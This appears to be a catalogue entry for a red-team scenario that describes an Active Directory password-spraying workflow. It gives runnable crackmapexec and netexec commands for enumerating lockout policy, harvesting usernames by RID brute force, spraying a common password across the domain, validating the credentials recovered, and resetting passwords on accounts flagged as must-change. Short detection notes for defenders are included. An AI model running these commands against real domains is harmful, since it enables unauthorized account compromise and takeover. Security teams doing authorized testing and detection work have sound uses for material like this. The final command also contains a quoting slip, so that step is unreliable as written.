title: AD Domain Password Spray Workflow (CME/NetExec/Kerbrute)
description: Lockout-aware AD password spraying pipeline that enumerates policy/users, performs controlled spray attempts, and validates recovered access paths.

metadata.descriptionHtml: This scenario models an operator-driven Active Directory spray workflow using crackmapexec, netexec, and kerbrute. It emphasizes policy-aware pacing, user-list preparation, and controlled handling of edge states such as STATUS_PASSWORD_MUST_CHANGE.
metadata.commandsBlock:
# Step 1: Enumerate password policy
$ crackmapexec <IP> -u 'user' -p 'password' --pass-pol

# Step 2: Build user list
$ netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'| ' '/SidTypeUser/ {print $3}' > users.txt

# Step 3: Perform lockout-aware spray
$ netexec smb <DC_FQDN> -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce --shares

# Step 4: Validate recovered credentials
$ netexec smb <DC.FQDN> -u <User> -p '<RecoveredPass>' --pass-pol

# Optional branch: handle STATUS_PASSWORD_MUST_CHANGE
$ env NEWPASS='P@ssw0rd!2025#' ; netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS='$NEWPASS'
prerequisites: Authorized assessment scope and domain context
Lockout policy awareness before authentication testing
attackerGains: Account state intelligence for follow-on access testing
detectionNotes: Alert on distributed failed-auth spikes across many usernames
Enforce smart lockout and MFA/Conditional Access
Monitor unusual SMB/Kerberos authentication source patterns

steps.name: Enumerate Password Policy
steps.description: Query lockout and password policy parameters before any broad authentication activity.

steps.name: Build Candidate Username Set
steps.description: RID brute and related checks derive likely valid domain usernames for controlled spray testing.

steps.name: Execute Lockout-Aware Spray
steps.description: Test a constrained password set across many users with anti-lockout controls.

steps.name: Receive Authentication Outcomes
steps.description: Domain controller returns success/failure and account-state results from spray attempts.

steps.name: Consolidate Valid Credentials
steps.description: Consolidate successful authentication outcomes into a validated credential set for authorized follow-on testing.

steps.name: Optional Must-Change-Password Branch
steps.cli: env NEWPASS='P@ssw0rd!2025#' ; netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS='$NEWPASS'
steps.description: Optional branch: for eligible STATUS_PASSWORD_MUST_CHANGE accounts, set a known password and re-validate access.

steps.name: Return Results to Operator
steps.description: Verified credentials and account-state findings are returned to the operator for controlled next actions.
